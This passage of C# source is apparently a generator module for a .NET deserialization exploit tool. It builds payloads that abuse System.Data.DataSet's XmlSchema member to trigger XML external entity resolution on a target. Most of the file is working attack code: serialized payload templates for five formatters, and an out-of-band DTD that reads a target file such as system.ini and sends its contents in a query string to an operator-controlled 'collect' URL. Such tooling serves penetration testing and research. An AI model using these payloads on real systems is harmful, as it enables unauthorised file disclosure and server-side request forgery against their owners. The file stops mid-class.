using NDesk.Options;
using System;
using System.Collections.Generic;
using System.IO;
using System.Runtime.Serialization;
using System.Text;
using ysonet.Helpers;

namespace ysonet.Generators
{
    /*
     * DataSetXxe: makes a target that deserializes System.Data.DataSet parse an XML document
     * the operator wrote, with a legacy XmlTextReader that still resolves external entities.
     *
     * THE SINK IS IN THE DESERIALIZATION CONSTRUCTOR. System.Data.DataSet is [Serializable]
     * and ISerializable. Its serialization constructor reads the members back and, for the
     * default XML remoting format, hands one of them to a LEGACY XmlTextReader:
     *
     *   DataSet(SerializationInfo, StreamingContext)
     *     -> DataSet(info, context, ConstructSchema: true)
     *          the "DataSet.RemotingFormat" member decides the shape; it is absent here, so
     *          the constructor keeps its established default of SerializationFormat.Xml
     *     -> DeserializeDataSet(info, context, ...)
     *     -> DeserializeDataSetSchema(info, context)
     *          -> string text = (string)info.GetValue("XmlSchema", typeof(string));
     *          -> ReadXmlSchema(new XmlTextReader(new StringReader(text)), denyResolving: true)
     *
     * So the whole payload is one string member: an XML document of the operator's choosing,
     * parsed by a reader nothing has hardened.
     *
     * WHY denyResolving DOES NOT STOP IT. That flag only nulls the resolver of the XSD schema
     * SET, which is what would follow an xs:import or xs:include. The DOCTYPE is parsed by the
     * XmlTextReader itself while it moves to the first content node, BEFORE any XSD logic
     * runs, so the external entity is fetched first. Whatever ReadXmlSchema thinks of the
     * document afterwards is irrelevant: the request has already left.
     *
     * WHAT ACTUALLY GATES IT (and it is not a CLR build). new XmlTextReader(TextReader) uses
     * the v1-compatible XmlTextReaderImpl constructor, which takes its resolver from
     * XmlReaderSettings.EnableLegacyXmlSettings():
     *
     *   legacy   -> new XmlUrlResolver()   -> the external subset is fetched
     *   hardened -> null                   -> DtdParserProxy_PushExternalSubset returns false
     *
     * and EnableLegacyXmlSettings() is true when the deserializing APPLICATION targets below
     * .NET Framework 4.5.2, or when the machine opted back in through the
     * EnableLegacyXmlSettings switch. Every modern 4.x runtime still fires this against such
     * an app, and no runtime fires it under the hardened default. THAT is what the declared
     * version span 4.0 - 4.5.1 means: the framework the TARGET APP was built against, not the
     * one installed where it runs, and not this tool's own. The machine-switch route is not a
     * version and stays in AdditionalInfo().
     *
     * TWO VARIANTS, AND THEY ARE NOT THE SAME EFFECT.
     *
     *   variant 1  the payload declares one external parameter entity and references it, so
     *              the target fetches a URL you name. That is SSRF and nothing else: no file
     *              content comes back to you.
     *   variant 2  the payload points at a DTD YOU HOST, and ysonet writes that DTD for you.
     *              The hosted DTD reads a file on the target and sends its content back in the
     *              query string of a second request. That is real file disclosure, and it is
     *              why variant 2 declares file-system and information-disclosure on top of
     *              network. It needs TWO artifacts: the payload, and the DTD you must publish.
     *
     * HOW THIS DIFFERS FROM DataViewManagerXxe, the other XXE gadget in this catalog. Same
     * XML configuration gate, opposite carrier and opposite formatter family:
     *
     *   DataViewManagerXxe  carrier System.Data.DataViewManager, sink is a property SETTER,
     *                       so the serializers that set members BY NAME are the ones that work
     *   DataSetXxe          carrier System.Data.DataSet, sink is the ISerializable
     *                       CONSTRUCTOR, so only serializers that INVOKE that constructor work
     *
     * Neither list contains the other, so the two gadgets together cover both carrier shapes.
     *
     * LOCAL SAFETY. The generator never constructs a live DataSet: an inert ISerializable
     * marshal carries the type. Nothing in -c or --file is opened, resolved or contacted while
     * building; --file names a path on the TARGET and is written into the hosted DTD as text.
     * None of the three inputs is validated for shape - a system identifier is whatever the
     * TARGET's parser resolves, and refusing forms here would only block the research this
     * gadget is for. The one local side effect is the file variant 2 writes at --dtd-out,
     * which replaces what is there and creates a missing folder, and is written only after
     * the payload is built so a failed run changes nothing.
     * -t is ALLOWED and behaves like the other network gadgets - it deserializes the payload
     * here, so THIS machine performs the fetch. On a normal (4.7.2) ysonet.exe the hardened
     * default means the resolver is null and nothing is fetched at all.
     */
    public class DataSetXxeGenerator : GenericGenerator
    {
        // Public so the tests can name the exact type and members instead of repeating the
        // literals (same reason WbemClassObjectUnmarshalGenerator's constants are public).
        public const string DataSetClrName = "System.Data.DataSet";
        public const string DataSetAssemblyName =
            "System.Data, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089";
        public const string DataSetTypeName = DataSetClrName + ", " + DataSetAssemblyName;

        // The member the serialization constructor hands to the legacy XmlTextReader, and the
        // companion member it reads straight after it. The ORDER matters to nothing here, but
        // the names do: they are what the constructor looks up by string.
        public const string SchemaMemberName = "XmlSchema";
        public const string DiffGramMemberName = "XmlDiffGram";

        public const int VariantExternalDtd = 1;
        public const int VariantOobFileRead = 2;

        // Canonical long option names, so the generator, its help, the variant option scope
        // and the tests cannot drift apart.
        public const string VariantOptionName = "variant";
        public const string RawInputOptionName = "rawinput";
        public const string TargetFileOptionName = "file";
        public const string DtdOutOptionName = "dtd-out";

        // Shown in the empty-input refusal and in the option help.
        public const string ExampleUrl = "http://127.0.0.1:8080/x.dtd";

        // The two paths variant 2 builds under the collaborator base URL. The payload fetches
        // the first; the hosted DTD sends the file content to the second.
        public const string CompanionDtdName = "dataset-oob.dtd";
        public const string CollectPath = "collect";

        // Characters that BREAK the variant 2 chain when they appear in the disclosed file,
        // measured on .NET Framework 4.8.1 against a 4.5.1-targeted app (see the option help).
        // Kept as one string so the help text and the tests read the same list.
        public const string OobBreakingCharacters = "& % ' #";

        private int variantNumber = VariantExternalDtd;
        private bool rawInput;
        private string targetFileUri;
        private string dtdOutPath;

        // ---- Metadata ----------------------------------------------------------

        // Discovery facets (category search only). The gadget default is variant 1, whose
        // proven effect is one outbound request, so the gadget declares Network alone.
        // Information disclosure is deliberately NOT declared here: an external DTD fetch
        // proves SSRF, and variant 1 returns no file content to the sender. Variant 2 earns
        // the extra kinds with its own test and overrides the set below.
        //
        // Versions describe the TARGET, and for the same reason as DataViewManagerXxe the
        // deciding number is the framework the target APPLICATION was BUILT against, not the
        // one installed on the machine it runs on: EnableLegacyXmlSettings() reads the entry
        // assembly's TargetFrameworkAttribute, so an app stamped below 4.5.2 fetches and one
        // stamped 4.5.2 or above never does, on every modern runtime. Hence 4.0 to 4.5.1.
        // A machine with the switch turned back on is the other way in, is not a version, and
        // stays in AdditionalInfo().
        public override GadgetFacetSet Facets()
        {
            return new GadgetFacetSet()
                .WithKinds(PayloadKind.Network)
                .WithVersions(RuntimeVersion.Range(RuntimeVersion.NetFx40, RuntimeVersion.NetFx451))
                .WithRequirements(GadgetRequirement.BuiltIn, GadgetRequirement.NetFramework);
        }

        // SCRT published the DataSet "XmlSchema" XXE path, including the out-of-band file
        // read, in ".NET Serialiception" (see docs/references.md). The DataViewManager setter
        // carrier is a different technique by different people and is credited on that gadget.
        public override string Finders()
        {
            return "SCRT";
        }

        public override string Contributors()
        {
            return "Soroush Dalili";
        }

        // Two short sentences: this is the FIRST block of the interactive info panel and a
        // long one pushes the formatter, command-input and category lines off the screen. The
        // mechanics live in the header comment and the option help.
        public override string AdditionalInfo()
        {
            return "Sets the DataSet XmlSchema member so the target's legacy XmlTextReader resolves an external entity. Variant 1 fetches your URL; variant 2 reads a target file back to you. Only fires when the target app uses pre-4.5.2 XML resolver defaults.";
        }

        public override List<string> Labels()
        {
            // Independent: it owns its whole chain and serializes a framework type of its own.
            // It reuses no other gadget and no other gadget reuses it.
            return new List<string> { GadgetTags.Independent };
        }

        // Every formatter that can drive the ISerializable CONSTRUCTOR, and only those.
        //
        // That constructor is the whole gadget: DeserializeDataSetSchema is reached from
        // nowhere else, and "XmlSchema" is a SerializationInfo entry, not a field or a
        // property. So a serializer that rebuilds objects by setting members BY NAME can never
        // fire this, however well it can name the type - which rules out Xaml, XmlSerializer,
        // JavaScriptSerializer, YamlDotNet, FastJson, both SharpSerializer modes and both
        // MessagePack typeless flavours. That is the exact inverse of DataViewManagerXxe.
        //
        // THE WHOLE DataContract FAMILY IS OUT, and it fails SILENTLY, which is why it was
        // measured rather than assumed. DataSet also implements IXmlSerializable, and the
        // DataContract stack resolves that FIRST, so it builds an XmlDataContract and drives
        // DataSet.ReadXml over the document instead of the serialization constructor:
        //
        //   NetDataContractSerializer  returns a real, EMPTY DataSet. No exception, no fetch.
        //   DataContractSerializer     same: a real DataSet with no tables.
        //   DataContractJsonSerializer throws, because the <root> content is not DataSet XML.
        //
        // A silent empty DataSet is exactly the failure a generation-only check would pass, so
        // the exclusion is locked by a test that asserts the schema was NOT applied.
        //
        // Json.NET IS in, which also had to be measured: Newtonsoft ships a built-in
        // DataSetConverter, but with the TypeNameHandling configuration this project models,
        // the ISerializable contract wins and the constructor runs. Its document must carry
        // BOTH members - with XmlDiffGram absent the constructor throws "Member 'XmlDiffGram'
        // was not found" on this path.
        //
        // Each formatter below was proven by reaching the sink, not by generating: a probe fed
        // a real XSD through it and required the resulting DataSet to carry the table that
        // schema declares, and FireDataSetXxe then fetches the DTD for real.
        //
        // The "(2)" suffix is a display-only annotation meaning "this formatter carries 2
        // variants". Both variants ship the same wire shape and differ only in what the XML
        // inside it says, so every formatter carries both.
        public override List<string> SupportedFormatters()
        {
            return new List<string>
            {
                Formatters.BinaryFormatter + " (2)",
                Formatters.SoapFormatter + " (2)",
                Formatters.LosFormatter + " (2)",
                Formatters.JsonNet + " (2)",
                Formatters.FsPickler + " (2)",
            };
        }

        // -c is a URL the TARGET fetches. Nothing is resolved or contacted while building.
        // Both variants take a URL, so there is no per-variant input type: what changes is
        // whether it names one DTD (variant 1) or a base the two hosted paths hang off
        // (variant 2).
        public override CommandInputType CommandInput()
        {
            return CommandInputType.Url;
        }

        public override List<GadgetVariant> Variants()
        {
            return new List<GadgetVariant>
            {
                // Variant 1 inherits the gadget's facets (a null override means "same"), and
                // declares the two options it has no use for so the interactive editor hides
                // them and never carries a value over from another module.
                new GadgetVariant(VariantExternalDtd,
                        "Fetch an external DTD: the target requests your URL (SSRF, default)")
                    .WithoutOptions(TargetFileOptionName, DtdOutOptionName),

                // Variant 2 overrides the WHOLE facet set, which is why the requirements AND
                // the versions are repeated: it reads a file on the target and returns its
                // content, so it is file-system and information-disclosure as well as
                // network, but it goes through the same legacy XmlTextReader and so lands on
                // exactly the same target framework span. Inputs are declared rather than
                // derived, because the accepted input is broader than -c alone: a
                // collaborator URL plus a target-side path in --file.
                new GadgetVariant(VariantOobFileRead,
                        "Read a target file out of band: needs --file, --dtd-out and a host you control")
                    .WithoutOptions(RawInputOptionName)
                    .WithFacets(new GadgetFacetSet()
                        .WithKinds(PayloadKind.Network, PayloadKind.FileSystem,
                            PayloadKind.InformationDisclosure)
                        .WithInputs(PayloadInput.RemoteUrl, PayloadInput.TargetPath)
                        .WithVersions(RuntimeVersion.Range(RuntimeVersion.NetFx40, RuntimeVersion.NetFx451))
                        .WithRequirements(GadgetRequirement.BuiltIn, GadgetRequirement.NetFramework)),
            };
        }

        public override OptionSet Options()
        {
            // Not RawInputOption(): that shared help says formatter-layer escaping is turned
            // off, which is NOT what happens here. This gadget always escapes the finished XML
            // for the outer payload; --rawinput only skips the check on the URL itself.
            return new OptionSet
            {
                {
                    "var|" + VariantOptionName + "=",
                    "Which XML to put in the DataSet XmlSchema member. Choices:\r\n"
                        + VariantExternalDtd + " (default) - declare one external parameter "
                        + "entity pointing at the -c URL and reference it, so the target FETCHES "
                        + "that URL. The effect is a single outbound request (SSRF / callback) "
                        + "and nothing comes back to you. Point it at any http or https URL you "
                        + "can observe.\r\n"
                        + VariantOobFileRead + " - read a file on the TARGET and have the target "
                        + "send its content to you. -c is the BASE URL of a host you control; "
                        + "ysonet builds two URLs under it, \"" + CompanionDtdName + "\" and \""
                        + CollectPath + "\". --file names what to read on the TARGET, in whatever "
                        + "form that target's parser resolves. "
                        + "--dtd-out is where ysonet writes the DTD you must publish at the "
                        + "first URL: without it hosted, the payload fetches a 404 and nothing "
                        + "is disclosed. Read the file content out of the query string of the "
                        + "request that arrives at the second URL.",
                    v => int.TryParse(v, out variantNumber)
                },
                {
                    RawInputOptionName,
                    "Variant " + VariantExternalDtd + " only. Skip the URL validation and put -c "
                        + "into the DTD external identifier exactly as typed, with no trimming. "
                        + "Normal mode accepts an absolute http or https URL and refuses "
                        + "whitespace, control characters and the characters \" < > \\, because "
                        + "the value goes inside a QUOTED DTD external identifier and those "
                        + "would corrupt or escape it. Use this only for research on a resolver "
                        + "that accepts something else; the network effect this gadget declares "
                        + "was proven with http(s). It does NOT turn off the outer formatter's "
                        + "escaping, so the payload is still a valid document - but nothing "
                        + "checks that the identifier inside it still is, and a broken one "
                        + "simply fetches nothing.",
                    v => { if (v != null) rawInput = true; }
                },
                {
                    TargetFileOptionName + "=",
                    "Variant " + VariantOobFileRead + " only, and required there. What to read "
                        + "ON THE TARGET, usually an absolute file: URI, for example "
                        + "\"file:///C:/Windows/system.ini\". The value is NOT validated or "
                        + "rewritten: it goes into the hosted DTD exactly as typed, so a bare "
                        + "path, a UNC path, an http URL or any other form the target's XML "
                        + "parser resolves is accepted, and finding out what it resolves is the "
                        + "point. Nothing is opened on this machine. It sits in a quoted DTD "
                        + "system identifier, where no references are recognised, so '%' and '&' "
                        + "are literal and \"file:///C:/Program%20Files/x.txt\" is the right way "
                        + "to write a space; only a double quote ends the identifier and breaks "
                        + "the DTD. WHAT COMES BACK "
                        + "RELIABLY, measured rather than assumed: the content travels in a URL "
                        + "query string, so spaces, line breaks, < > and \" all arrive "
                        + "percent-encoded and can be decoded. Any of " + OobBreakingCharacters
                        + " in the file BREAKS the chain and you get no second request at all, "
                        + "because the first three end a construct inside the DTD and the last "
                        + "one starts a URI fragment. That is why a short .ini style file comes "
                        + "back whole and a file full of entity references or apostrophes does "
                        + "not. Size is not the limit (4 KB came back intact; the reader's own "
                        + "entity budget is 10,000,000 characters).",
                    v => targetFileUri = v
                },
                {
                    DtdOutOptionName + "=",
                    "Variant " + VariantOobFileRead + " only, and required there. Where to write "
                        + "the companion DTD you have to publish at <-c>/" + CompanionDtdName
                        + ". The path is taken as given: a file already there is REPLACED and a "
                        + "missing folder is created, so generating twice to the same path works "
                        + "and ysonet says on stderr when it replaced something. The DTD is "
                        + "written only after the payload is built, so a failed run leaves what "
                        + "is already at that path alone. UTF-8 with no BOM, because the target "
                        + "reads it as an external subset with no XML declaration to learn an "
                        + "encoding from. This is separate from --outputpath, which still "
                        + "receives the payload itself.",
                    v => dtdOutPath = v
                },
            };
        }

        public override object Generate(string formatter, InputArgs inputArgs)
        {
            if (variantNumber != VariantExternalDtd && variantNumber != VariantOobFileRead)
                throw new ArgumentException(Name() + " has no variant " + variantNumber
                    + ". Use --" + VariantOptionName + " " + VariantExternalDtd
                    + " (fetch an external DTD) or --" + VariantOptionName + " " + VariantOobFileRead
                    + " (read a target file out of band).");

            object payload = variantNumber == VariantExternalDtd
                ? BuildPayload(XxeXml(ExternalDtdUrl(inputArgs)), formatter, inputArgs)
                : GenerateOobFileRead(formatter, inputArgs);

            ExplainSelfTest(inputArgs);
            return payload;
        }

        // When the operator runs -t and gets no request, it is almost always because THIS
        // ysonet build (4.7.2) hands its legacy XmlTextReader a null resolver, so the fetch
        // that the payload asks for simply had nothing to resolve with. That is the correct
        // result, not a broken payload, and saying so on -t stops the "it does nothing"
        // confusion. The note is printed only when -t is actually used and only when this
        // process would not have fetched, so a normal generation run is untouched.
        private void ExplainSelfTest(InputArgs inputArgs)
        {
            if (inputArgs == null || !inputArgs.Test)
                return;

            string note = Helpers.Core.LegacyXmlDefaults.SelfTestCannotFetchNote(Name());
            if (note != null)
                Console.Error.WriteLine(note);

            if (variantNumber == VariantOobFileRead)
                Console.Error.WriteLine(Name() + ": -t cannot show the file read either way - the "
                    + "disclosure needs the companion DTD hosted at your --dtd-out URL and a "
                    + "target that fetches it. Publish the DTD and watch the /" + CollectPath
                    + " endpoint to see the content arrive.");
        }

        // ---- Variant 1: fetch an external DTD ----------------------------------

        private string ExternalDtdUrl(InputArgs inputArgs)
        {
            RefuseOobOnlyOptions();

            string cmd = inputArgs == null ? null : inputArgs.Cmd;
            return rawInput
                ? DtdSystemLiteral.RequireRawValue(cmd, Name())
                : DtdSystemLiteral.ValidateHttpUrl(cmd, Name(), ExampleUrl);
        }

        // Refusing beats ignoring: a silently dropped --dtd-out would leave the operator
        // waiting for a DTD file that was never written.
        private void RefuseOobOnlyOptions()
        {
            if (targetFileUri != null)
                throw new ArgumentException(Name() + " variant " + VariantExternalDtd
                    + " does not use --" + TargetFileOptionName + ". That option belongs to "
                    + "variant " + VariantOobFileRead + ", which reads a target file; variant "
                    + VariantExternalDtd + " only makes the target fetch the -c URL. Add --"
                    + VariantOptionName + " " + VariantOobFileRead + " or drop the option.");

            if (dtdOutPath != null)
                throw new ArgumentException(Name() + " variant " + VariantExternalDtd
                    + " does not use --" + DtdOutOptionName + ". Variant " + VariantExternalDtd
                    + " emits one payload and no companion file; only variant "
                    + VariantOobFileRead + " writes a DTD for you to host.");
        }

        // ---- Variant 2: out-of-band file read ----------------------------------

        // Order matters here and is deliberate: the inputs are read first, then the payload
        // is built, and only then is the companion DTD written. So a missing option or a
        // formatter this gadget cannot produce still leaves the operator's disk exactly as
        // it was - including a file already sitting at --dtd-out, which a successful run
        // WOULD replace.
        private object GenerateOobFileRead(string formatter, InputArgs inputArgs)
        {
            string collaborator = CollaboratorBaseUrl(inputArgs);
            string fileUri = TargetFileUri();
            string outPath = CompanionDtdDestination();

            string companion = OobDtd(collaborator, fileUri);
            object payload = BuildPayload(XxeXml(collaborator + CompanionDtdName), formatter, inputArgs);
            bool replaced = WriteCompanionDtd(outPath, companion);

            // Variant 2 does nothing unless the operator hosts the DTD, so the instructions
            // are essential operator info in a normal run, not a debug aside - the same
            // reason the denial-of-service banner prints to stderr. It goes to STDERR so it
            // never mixes into the payload on stdout. The DTD file itself carries the full
            // instructions in a header comment (a reader who only sees the file still learns
            // them); this block adds the one thing the file cannot know - WHERE it was
            // written - and shows the exact bytes so the operator need not open it.
            Console.Error.WriteLine();
            Console.Error.WriteLine("=== " + Name() + " variant " + VariantOobFileRead
                + ": host this DTD to complete the chain ===");
            Console.Error.WriteLine("Wrote the companion DTD to: " + outPath
                + (replaced ? "  (replaced the file that was already there)" : ""));
            Console.Error.WriteLine("Publish it at:              " + collaborator + CompanionDtdName);
            Console.Error.WriteLine("Then watch for the file at: " + collaborator + CollectPath + "?d=<content>");
            Console.Error.WriteLine("The DTD (readable on purpose, and self-documenting):");
            foreach (string line in companion.Split('\n'))
                Console.Error.WriteLine("  " + line.TrimEnd('\r'));
            Console.Error.WriteLine("Reliable only for files without " + OobBreakingCharacters
                + " (see -g " + Name() + " help). Nothing was read on this machine; --file names "
                + "a path on the TARGET.");
            Console.Error.WriteLine();

            return payload;
        }

        // The base location both hosted paths hang off, taken exactly as typed. Variant 2
        // does not run the http/https check variant 1 uses: where an operator can publish a
        // DTD, and what a target will fetch it from, is not this gadget's decision. A UNC
        // share, a non-http scheme, or a URL that already carries a query string all pass.
        //
        // Two consequences the operator owns, which is why the stderr block below prints the
        // two finished URLs: a query string ends up in the MIDDLE of the built URL, and a
        // fragment truncates the exfiltrated content at the target. Both are visible in the
        // printed URLs and in the DTD itself.
        private string CollaboratorBaseUrl(InputArgs inputArgs)
        {
            string url = DtdSystemLiteral.RequireRawValue(
                inputArgs == null ? null : inputArgs.Cmd, Name());

            // The two names are APPENDED, so the value needs a separator at the end. Adding
            // one is mechanics, not validation: a backslash counts, so a UNC or file path
            // base is not turned into "\\host\share\/dataset-oob.dtd".
            if (url.EndsWith("/", StringComparison.Ordinal)
                || url.EndsWith("\\", StringComparison.Ordinal))
                return url;

            return url + "/";
        }

        // What to read ON THE TARGET, written into the hosted DTD exactly as typed - not
        // trimmed, not rewritten, not checked for shape. Nothing here opens or resolves it,
        // and it does not have to exist on this machine.
        //
        // THE FORM IS THE OPERATOR'S CHOICE, deliberately. What a target's XML resolver
        // accepts as a system identifier is the thing this gadget is used to find out, so a
        // file: URI, a bare Windows path, a UNC path, an http URL, or a scheme this catalog
        // has never seen all go through unchanged. Refusing a form here would only stop the
        // research the gadget exists for, and nothing about it is dangerous locally.
        //
        // What actually breaks the DTD is worth knowing, and it is a shorter list than the
        // old refusals implied. The value sits in a quoted SystemLiteral:
        //
        //   <!ENTITY % file SYSTEM "<here>">
        //
        // A SystemLiteral recognises NO references at all, so '%' and '&' are literal there:
        // "file:///C:/Program%20Files/x.txt" is correct, and the old check that banned '%'
        // contradicted its own advice to percent-encode spaces. Only a double quote really
        // hurts, because it ends the literal - and even that is left to the operator, who may
        // be testing exactly that. The "& % ' #" list in the option help is about the CONTENT
        // of the disclosed file, which is substituted into an entity value and a URI; it is a
        // different list for a different reason and still applies.
        private string TargetFileUri()
        {
            if (string.IsNullOrEmpty(targetFileUri))
                throw new ArgumentException(Name() + " variant " + VariantOobFileRead
                    + " needs --" + TargetFileOptionName
                    + " \"file:///C:/Windows/system.ini\": what to read ON THE TARGET. Any form "
                    + "the target's XML parser resolves is accepted and it is never opened on "
                    + "this machine, but it cannot be empty.");

            return targetFileUri;
        }

        // Where the companion DTD goes. The path is resolved to a full one so the stderr
        // block can print where the file actually landed, and that is all: an existing file
        // is replaced and a missing folder is created, because the operator named this exact
        // path and a refusal would just be ysonet arguing with them.
        //
        // Nothing is written HERE. The write happens after the payload is built (see
        // GenerateOobFileRead), so a bad input or a formatter this gadget cannot produce
        // still leaves an existing file at that path untouched.
        private string CompanionDtdDestination()
        {
            if (string.IsNullOrWhiteSpace(dtdOutPath))
                throw new ArgumentException(Name() + " variant " + VariantOobFileRead
                    + " needs --" + DtdOutOptionName + " \"<local path>\": the file ysonet "
                    + "writes for you to publish at <-c>/" + CompanionDtdName
                    + ". Without that DTD hosted, the payload fetches a 404 and discloses "
                    + "nothing.");

            return Path.GetFullPath(dtdOutPath.Trim());
        }

        /// <summary>
        /// The DTD the operator publishes at &lt;collaborator&gt;/dataset-oob.dtd. It is written
        /// out in full, with the target path and the collect endpoint spelled out, because a
        /// reader has to be able to copy it to a web root and understand what it does.
        ///
        /// %file; reads the target file. %build; is an entity whose VALUE is another entity
        /// declaration, so referencing it declares %exfil; with the file content already
        /// substituted into the URL. Referencing %exfil; then makes the target fetch that URL,
        /// which is how the content reaches the operator.
        ///
        /// &amp;#x25; is a literal '%'. It has to be written that way so the inner declaration
        /// is BUILT here and expanded on the target, instead of being expanded while the
        /// %build; entity value itself is parsed.
        ///
        /// This nesting lives in the EXTERNAL DTD, not in the payload, because an internal
        /// subset cannot reference a parameter entity inside a markup declaration.
        /// </summary>
        internal static string OobDtd(string collaboratorBaseUrl, string targetFileUri)
        {
            // A header comment says what to DO with the file, so an operator who only ever
            // sees the payload on stdout and a new file on disk still learns that this one
            // has to be published and where. It is a legal XML comment, so the DTD stays a
            // valid external subset and can be served exactly as written.
            //
            // A comment must not contain a double hyphen, which would make the served DTD
            // unparseable, so the instructions below use no "--". The values interpolated in
            // (the base URL, the companion name "dataset-oob.dtd", the target URI) carry only
            // single hyphens.
            string header =
                  "ysonet DataSetXxe companion DTD. Publish this file, unchanged, at\n"
                + "     " + collaboratorBaseUrl + CompanionDtdName + "\n"
                + "     and watch for the file content in the d= query string of a request to\n"
                + "     " + collaboratorBaseUrl + CollectPath + "\n"
                + "     It reads " + targetFileUri + " on the target. Reliable only for files\n"
                + "     with none of " + OobBreakingCharacters + " in them. The ENTITY lines\n"
                + "     below are authoritative if this note ever shows a value differently.";

            // A double hyphen is illegal inside an XML comment, and an operator's base URL or
            // target URI could contain one, which would make the SERVED DTD unparseable and
            // silently break their own chain. Neutralise it for the human note only; the
            // authoritative copies are the ENTITY declarations below, which are never touched.
            header = header.Replace("--", "- -");

            return "<!-- " + header + " -->\n"
                 + "<!ENTITY % file SYSTEM \"" + targetFileUri + "\">\n"
                 + "<!ENTITY % build \"<!ENTITY &#x25; exfil SYSTEM '"
                 + collaboratorBaseUrl + CollectPath + "?d=%file;'>\">\n"
                 + "%build;\n"
                 + "%exfil;\n";
        }

        // Writes the DTD where the operator asked, UTF-8 without a BOM. A BOM would be the
        // first bytes of the external subset and the target's DTD parser has no XML
        // declaration to learn the encoding from, so it must not be there.
        //
        // The path is taken at face value: a missing folder is created and an existing file
        // is replaced, so generating twice to the same path works. Returns true when a file
        // was replaced, which the caller reports on stderr - the operator should be told
        // their file changed, even though they asked for it.
        private bool WriteCompanionDtd(string path, string content)
        {
            string folder = Path.GetDirectoryName(path);
            bool createdFolder = false;
            if (!string.IsNullOrEmpty(folder) && !Directory.Exists(folder))
            {
                Directory.CreateDirectory(folder);
                createdFolder = true;
            }

            bool replaced = File.Exists(path);
            bool created = false;
            try
            {
                byte[] bytes = new UTF8Encoding(false).GetBytes(content);
                using (var stream = new FileStream(path, FileMode.Create, FileAccess.Write, FileShare.None))
                {
                    created = !replaced;
                    stream.Write(bytes, 0, bytes.Length);
                }
            }
            catch (Exception)
            {
                // Only ever remove what THIS call brought into existence. A file that was
                // already there is left where it is: FileMode.Create has already truncated
                // it, and deleting it as well would take the operator's own path away too.
                if (created)
                {
                    try { File.Delete(path); } catch { }
                }
                // Same rule for the folder. Only the leaf is removed, so a deeper chain can
                // leave empty parents behind - harmless, and worth less than the complexity
                // of unwinding them.
                if (createdFolder)
                {
                    try { Directory.Delete(folder); } catch { }
                }
                throw;
            }

            return replaced;
        }

        // ---- The payload -------------------------------------------------------

        /// <summary>
        /// The document that lands in the DataSet's XmlSchema member. It is not a schema and
        /// does not need to be: the DOCTYPE is parsed while the XmlTextReader moves to the
        /// first content node, so the external entity is fetched before ReadXmlSchema forms
        /// any opinion about the document.
        ///
        /// %remote; is REFERENCED as well as declared. A parameter entity that is only declared
        /// is never resolved, so the reference is what forces the fetch.
        ///
        /// The DOCTYPE name matches the root element so the document is well formed. The name
        /// itself is arbitrary - unlike DataViewManagerXxe, nothing on the target compares it.
        /// </summary>
        internal static string XxeXml(string dtdUrl)
        {
            return "<!DOCTYPE ds ["
                 + "<!ENTITY % remote SYSTEM \"" + dtdUrl + "\">"
                 + "%remote;"
                 + "]><ds/>";
        }

        private object BuildPayload(string xml, string formatter, InputArgs inputArgs)
        {
            if (IsFormatter(formatter, Formatters.BinaryFormatter)
                || IsFormatter(formatter, Formatters.SoapFormatter)
                || IsFormatter(formatter, Formatters.LosFormatter))
                // Serialize() owns minification of the OUTER payload and the -t read-back. The
                // schema string is deliberately not minified separately: it is already one
                // line, and rewriting it here would be a second, invisible transformation of
                // the operator's URL.
                return Serialize(new DataSetXxeMarshal(xml), formatter, inputArgs);

            if (IsFormatter(formatter, Formatters.JsonNet))
                return FinishHandWrittenPayload(BuildJsonNetPayload(xml), formatter, inputArgs);

            if (IsFormatter(formatter, Formatters.FsPickler))
                return FinishHandWrittenPayload(BuildFsPicklerPayload(xml), formatter, inputArgs);

            throw UnsupportedFormatter(formatter);
        }

        // Json.NET reaches an ISerializable type's constructor when TypeNameHandling resolves
        // the type, so the document is hand written: Json.NET's own serializer would write
        // $type from the marshal's runtime type and ignore SerializationInfo.SetType.
        //
        // XmlDiffGram is present and null for a reason: on this path the constructor looks the
        // member up and throws "Member 'XmlDiffGram' was not found" when it is absent.
        //
        // The template quotes with DOUBLE quotes, so it escapes with EscapeForJsonDoubleQuoted.
        // EscapeForJson would also write an apostrophe as \', which is not a legal JSON escape:
        // fastJSON DROPS the character, and an operator URL containing one would reach the
        // target with it missing.
        private string BuildJsonNetPayload(string xml)
        {
            return @"{
  ""$type"": """ + DataSetTypeName + @""",
  """ + SchemaMemberName + @""": """ + EscapeForJsonDoubleQuoted(xml, false) + @""",
  """ + DiffGramMemberName + @""": null
}";
        }

        // FsPickler's JSON form for an ISerializable object is a list of serializationEntries,
        // each naming the member, its declared type and its value. A STRING entry carries its
        // value directly; the object wrapper FsPickler uses for an array value is rejected here
        // ("expected end of JSON object but was 'PropertyName'"). That shape was taken from
        // what FsPickler itself accepts for this member set, not guessed.
        private string BuildFsPicklerPayload(string xml)
        {
            return @"{
  ""FsPickler"": ""4.0.0"",
  ""type"": ""System.Object"",
  ""value"": {
    ""_flags"": ""subtype"",
    ""subtype"": {
      ""Case"": ""NamedType"",
      ""Name"": """ + DataSetClrName + @""",
      ""Assembly"": {
        ""Name"": ""System.Data"",
        ""Version"": ""4.0.0.0"",
        ""Culture"": ""neutral"",
        ""PublicKeyToken"": ""b77a5c561934e089""
      }
    },
    ""instance"": {
      ""serializationEntries"": [
        {
          ""Name"": """ + SchemaMemberName + @""",
          ""Type"": " + FsPicklerStringType + @",
          ""Value"": """ + EscapeForJsonDoubleQuoted(xml, false) + @"""
        },
        {
          ""Name"": """ + DiffGramMemberName + @""",
          ""Type"": " + FsPicklerStringType + @",
          ""Value"": null
        }
      ]
    }
  }
}";
        }

        // The declared type of both serialization entries above. Spelled out once because it
        // is the same value twice, not because it is shared with anything else.
        private const string FsPicklerStringType =
            @"{ ""Case"": ""NamedType"", ""Name"": ""System.String"", ""Assembly"": { ""Name"": ""mscorlib"", ""Version"": ""4.0.0.0"", ""Culture"": ""neutral"", ""PublicKeyToken"": ""b77a5c561934e089"" } }";
    }

    // Emits System.Data.DataSet without ever constructing one.
    //
    // The target IS ISerializable, so the runtime formatters ask this marshal for the member
    // set and hand it straight to the target's serialization constructor. XmlDiffGram is
    // written as a null string so the member layout the constructor reads is complete; the
    // constructor skips a null diffgram, which keeps the SECOND legacy XmlTextReader in
    // DeserializeDataSetData out of the payload. One sink is enough.
    //
    // "DataSet.RemotingFormat" is deliberately absent: the constructor defaults it to
    // SerializationFormat.Xml, which is the path this gadget needs.
    //
    // Internal on purpose, and separate from the public DataSetXmlMarshal that
    // DataSetOldBehaviourGenerator owns: a gadget must stay deletable on its own, so this file
    // depends on no other generator.
    [Serializable]
    internal sealed class DataSetXxeMarshal : ISerializable
    {
        private readonly string _xmlSchema;

        internal DataSetXxeMarshal(string xmlSchema)
        {
